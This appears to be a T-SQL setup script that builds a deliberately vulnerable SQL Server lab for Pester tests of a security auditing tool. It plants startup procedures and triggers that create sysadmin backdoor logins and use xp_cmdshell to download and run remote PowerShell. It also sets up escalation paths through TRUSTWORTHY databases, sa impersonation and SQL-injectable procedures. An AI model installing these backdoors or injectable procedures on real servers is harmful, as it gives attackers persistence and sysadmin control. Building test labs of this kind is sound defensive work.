-- Setup Test Database Configuration for Pester Tests

------------------------------------------------------------
-- Create Testdb Database, Tables and Sample Data
------------------------------------------------------------

-- Create testdb database
CREATE DATABASE testdb

-- Select testdb database
USE testdb

-- Create noclist table
CREATE TABLE dbo.NOCList
(SpyName text NOT NULL,RealName text NULL)

-- Add sample records to table 
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Sean Connery')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Ethan Hunt','Tom Cruise')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Jason Bourne','Matt Damon')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Daniel Craig')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Pierce Bronsan')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Roger Moore')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Timothy Dolton')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','George Lazenby')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Harry Hart',' Colin Firth')

-- Create tracking table
 CREATE TABLE [dbo].[tracking](
	[card] [varchar](50) NULL
) ON [PRIMARY]

INSERT INTO [dbo].[tracking] ([card])
VALUES ('6011998081409707')

INSERT INTO [dbo].[tracking] ([card])
VALUES ('4012888888881881')

INSERT INTO [dbo].[tracking] ([card])
VALUES ('601199808140asdf')

INSERT INTO [dbo].[tracking] ([card])
VALUES ('40128888888')

-- Create secrets table
CREATE TABLE [dbo].[secrets](
	[password] [nchar](10) NULL
) ON [PRIMARY]

INSERT INTO [dbo].[secrets] ([password])
VALUES ('password1')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('password2')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('SuperSecretPass!')

------------------------------------------------------------
-- Create SQL Logins and Database Users
------------------------------------------------------------
 
-- Select the testdb database
USE testdb
 
-- Create server login
CREATE LOGIN [test1] WITH PASSWORD = 'test1', CHECK_POLICY = OFF;
 
-- Create database account for the login
CREATE USER [testuser] FROM LOGIN [testuser];
 
-- Assign default database for the login
ALTER LOGIN [testuser] with default_database = [testdb];
 
-- Add table insert privileges
GRANT INSERT ON testdb.dbo.NOCList to [testuser]
 
-- Create sysadmin server login
CREATE LOGIN [test2] WITH PASSWORD = 'test2', CHECK_POLICY = OFF;
EXEC sp_addsrvrolemember 'test2', 'sysadmin';
 

------------------------------------------------------------
-- Create Audit, Server Spec, and Database Spec
------------------------------------------------------------

-- Select master database
USE master
 
-- Create audit
CREATE SERVER AUDIT Audit_Object_Changes
TO APPLICATION_LOG
WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE)
ALTER SERVER AUDIT Audit_Object_Changes
WITH (STATE = ON)

-- Create server audit specification
CREATE SERVER AUDIT SPECIFICATION Audit_Server_Level_Object_Changes
FOR SERVER AUDIT Audit_Object_Changes
ADD (SERVER_OBJECT_CHANGE_GROUP),
ADD (SERVER_OBJECT_PERMISSION_CHANGE_GROUP),
ADD (SERVER_PERMISSION_CHANGE_GROUP),
ADD (SERVER_PRINCIPAL_IMPERSONATION_GROUP)
WITH (STATE = ON)

-- Create the database audit specification
CREATE DATABASE AUDIT SPECIFICATION Audit_Database_Level_Object_Changes
FOR SERVER AUDIT Audit_Object_Changes
ADD (DATABASE_OBJECT_CHANGE_GROUP) 
WITH (STATE = ON)
GO


------------------------------------------------------------
-- Create Malicious Startup Stored Procedures
------------------------------------------------------------

USE MASTER
GO

CREATE PROCEDURE sp_add_backdoor_account
AS

-- create sql server login backdoor_account
CREATE LOGIN backdoor_account WITH PASSWORD = 'backdoor_account', CHECK_POLICY = OFF;

-- Add backdoor_account to sysadmin fixed server role
EXEC sp_addsrvrolemember 'backdoor_account', 'sysadmin';

GO
 
CREATE PROCEDURE sp_add_backdoor
AS
-- Download and execute PowerShell code from the internet
EXEC master..xp_cmdshell 'powershell -C "Invoke-Expression (new-object System.Net.WebClient).DownloadString(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1'')"'
GO

 -- Configure stored procedures to run at startup

-- Set 'sp_add_backdoor_account' to auto run
EXEC sp_procoption @ProcName = 'sp_add_backdoor_account',
@OptionName = 'startup',
@OptionValue = 'on';
 
-- Setup 'sp_add_backdoor' to auto run
EXEC sp_procoption @ProcName = 'sp_add_backdoor',
@OptionName = 'startup',
@OptionValue = 'on';


------------------------------------------------------------
-- Enable xp_cmdshell
------------------------------------------------------------

sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO
 
sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO

------------------------------------------------------------
-- Create Malicous Triggers
------------------------------------------------------------

-- Select master database
USE master

-- Create the DDL trigger
CREATE Trigger [persistence_ddl_1]
ON ALL Server
FOR DDL_LOGIN_EVENTS
AS
 
-- Download and run a PowerShell script from the internet
EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_ddl.ps1'')"';
 
-- Add a sysadmin named 'SysAdmin_DDL' if it doesn't exist
if (SELECT count(name) FROM sys.sql_logins WHERE name like 'SysAdmin_DDL') = 0
 
	-- Create a login
	CREATE LOGIN SysAdmin_DDL WITH PASSWORD = 'SysAdmin_DDL', CHECK_POLICY = OFF;;
	
	-- Add the login to the sysadmin fixed server role
	EXEC sp_addsrvrolemember 'SysAdmin_DDL', 'sysadmin';
GO


-- Select testdb database
USE testdb
 
-- Create the DML trigger
CREATE TRIGGER [persistence_dml_1]
ON testdb.dbo.NOCList 
FOR INSERT, UPDATE, DELETE AS
 
-- Download a PowerShell script from the internet to memory and execute it
EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_dml.ps1'')"';
 
-- Add a sysadmin named 'SysAdmin_DML' if it doesn't exist
if (select count(*) from sys.sql_logins where name like 'SysAdmin_DML') = 0
 
	-- Create a login
	CREATE LOGIN SysAdmin_DML WITH PASSWORD = 'SysAdmin_DML', CHECK_POLICY = OFF;;
	
	-- Add the login to the sysadmin fixed server role
	EXEC sp_addsrvrolemember 'SysAdmin_DML', 'sysadmin';
Go


------------------------------------------------------------
-- Setup Db_OWNER scenario
------------------------------------------------------------
 
-- Create database
CREATE DATABASE MyAppDb 
-- Verify sa is the owner of the application database
SELECT suser_sname(owner_sid)
FROM sys.databases
WHERE name = 'MyAppDb'


-- Create login
CREATE LOGIN MyAppUser WITH PASSWORD = 'MyAppUser', CHECK_POLICY = OFF;

-- Setup MyAppUsers the db_owner role in MyAppDb
USE MyAppDb
ALTER LOGIN [MyAppUser] with default_database = [MyAppDb];
CREATE USER [MyAppUser] FROM LOGIN [MyAppUser];
EXEC sp_addrolemember [db_owner], [MyAppUser];
 

ALTER DATABASE MyAppDb SET TRUSTWORTHY ON
 
-- Create a stored procedure to add MyAppUser to sysadmin role
USE MyAppDb
GO
CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'MyAppUser','sysadmin'
GO

------------------------------------------------------------
-- Setup Impersonation Scenario
------------------------------------------------------------

-- Create login 1
CREATE LOGIN MyUser1 WITH PASSWORD = 'MyUser1', CHECK_POLICY = OFF;
 
-- Create login 2
CREATE LOGIN MyUser2 WITH PASSWORD = 'MyUser2!', CHECK_POLICY = OFF;
 
-- Create login 3
CREATE LOGIN MyUser3 WITH PASSWORD = 'MyUser3', CHECK_POLICY = OFF;
 
-- Create login 4
CREATE LOGIN MyUser4 WITH PASSWORD = 'MyUser4', CHECK_POLICY = OFF;

-- Grant myuser1 impersonate privilege on myuser2, myuser3, and sa
USE master;
GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];
GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];
GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];
GO
 

------------------------------------------------------------
-- Setup SQLi SP Scenario
------------------------------------------------------------

-- Select database
USE master
GO
 
-- Create login
CREATE LOGIN MyUser WITH PASSWORD = 'MyUser', CHECK_POLICY = OFF;
GO
 
-- Set login’s default database
ALTER LOGIN [MyUser] with default_database = [master];
GO

ALTER DATABASE master SET TRUSTWORTHY ON
 
-- Select the target database
USE MASTER;
GO
 
-- Create procedure
CREATE PROCEDURE sp_sqli
@DbName varchar(max)
WITH EXECUTE AS OWNER
AS
BEGIN
Declare @query as varchar(max)
SET @query = 'SELECT name FROM master..sysdatabases where name like ''%'+ @DbName+'%'' OR name=''tempdb''';
EXECUTE(@query)
END
GO
 
-- Allow members of PUBLIC to execute it
GRANT EXECUTE ON sp_sqli to PUBLIC
 

------------------------------------------------------------
-- Setup SQLi SP Scenario - Cert Based
------------------------------------------------------------

-- Set target database
USE MASTER;
GO
 
-- Create procedure
CREATE PROCEDURE sp_sqli2
@DbName varchar(max)
AS
BEGIN
Declare @query as varchar(max)
SET @query = 'SELECT name FROM master..sysdatabases where name like ''%'+ @DbName+'%'' OR name=''tempdb''';
EXECUTE(@query)
END
GO

-- Create a master key for the database
CREATE MASTER KEY ENCRYPTION BY PASSWORD = 'SuperSecretPasswordHere!';
GO

-- Create certificate for the sp_sqli2 procedure
CREATE CERTIFICATE sp_sqli2_cert
WITH SUBJECT = 'This should be used to sign the sp_sqli2',
EXPIRY_DATE = '2050-10-20';
GO

-- Create cert login
CREATE LOGIN sp_sqli2_login
FROM CERTIFICATE sp_sqli2_cert

-- Add cert to stored procedure
ADD SIGNATURE to sp_sqli2
BY CERTIFICATE sp_sqli2_cert;
Go
 
-- Add sp_sqli2_login to sysadmin fixed server role
EXEC master..sp_addsrvrolemember @loginame = N'sp_sqli2_login', @rolename = N'sysadmin'
GO

	
GRANT EXECUTE ON sp_sqli2 to PUBLIC
